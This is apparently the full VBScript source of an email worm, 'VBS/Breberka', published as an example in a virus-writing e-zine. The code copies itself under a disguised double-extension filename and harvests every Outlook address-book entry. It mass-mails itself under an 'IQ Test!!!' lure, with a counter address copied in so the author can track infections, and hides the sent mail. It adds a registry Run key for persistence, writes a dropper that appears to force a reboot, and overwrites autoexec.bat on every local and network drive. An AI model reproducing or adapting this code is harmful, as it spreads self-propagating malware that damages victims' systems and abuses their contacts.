'<VBS/Breberka>---<by>---<gl_storm[mions]>
'Example of VBS i-worm for Mions e-zine #1

Dim Outlook, Mapi, Out, Adress, AdressList, TemporaryFolder, WinDir, Fso, Breberka, Dropper, RegEdit
On Error Resume Next
Set Fso = CreateObject("Scripting.FileSystemObject")
Set RegEdit = CreateObject("WScript.Shell")
Set Breberka = Fso.GetFile(WScript.ScriptFullName)
Set TemporaryFolder = Fso.GetSpecialFolder(2)
Set WinDir = Fso.GetSpecialFolder(0)
If RegEdit.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Breberka") <> "...by gl" Then
 Set Outlook = CreateObject("Outlook.Application")
 Breberka.Copy (WinDir & "\winhelp.vbe")
 Breberka.Copy (TemporaryFolder & "\Breberka.txt          .vbe")
 Call Collect_Adress
 Call Send_Me
End If
Call Drop_Me

Sub Collect_Adress()
On Error Resume Next
Set Mapi = Outlook.GetNameSpace("MAPI")
AdressList = "breberka_counter@seznam.cz"
For Each Adress In Mapi.AddressLists
 For i = 1 To Adress.AddressEntries.Count
   AdressList = AdressList & ";" & Adress.AddressEntries(i)
 Next
Next
End Sub

Sub Send_Me()
On Error Resume Next
Set Out = Outlook.CreateItem(0)
 Out.Subject = "IQ Test!!!"
 Out.Body = vbCrLf & "r u stupid? [Y/N] ;)))" & vbCrLf & vbCrLf & vbCrLf
 Out.BCC = AdressList
 Out.Attachments.Add TemporaryFolder & "\Breberka.txt          .vbe"
 Out.DeleteAfterSubmit = True
'Out.Importance = ImportanceHigh
 Out.Send
RegEdit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Breberka", "...by gl"
End Sub

Sub Drop_Me()
On Error Resume Next
Dim Temp, Drive, AllDrives, AutoExec
RegEdit.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SysHelp / StartUp", WinDir & "\winhelp.vbe"
Set Dropper = Fso.CreateTextFile(TemporaryFolder & "\dropper.com", True)
Temp = Space(16)
Temp = Chr(184) & Chr(64) & Chr(0) & Chr(142) & Chr(216) & Chr(199) & Chr(6) & Chr(114) & Chr(0) & Chr(0) & Chr(0) & Chr(234) & Chr(0) & Chr(0) & Chr(255) & Chr(255)
Dropper.Write Temp
Dropper.Close
Set Dropper = Fso.GetFile(TemporaryFolder & "\dropper.com")
Set AllDrives = Fso.Drives
For Each Drive In AllDrives
  If (Drive.DriveType = 2) Or (Drive.DriveType = 3) Then
    Dropper.Copy (Drive.DriveLetter & ":\dropper.com")
    Breberka.Copy (Drive.DriveLetter & ":\Breberka.txt          .vbe")
    Set AutoExec = Fso.CreateTextFile(Drive.DriveLetter & ":\autoexec.bat", True)
    AutoExec.Write "@dropper.com"
    AutoExec.Close
  End If
Next
End Sub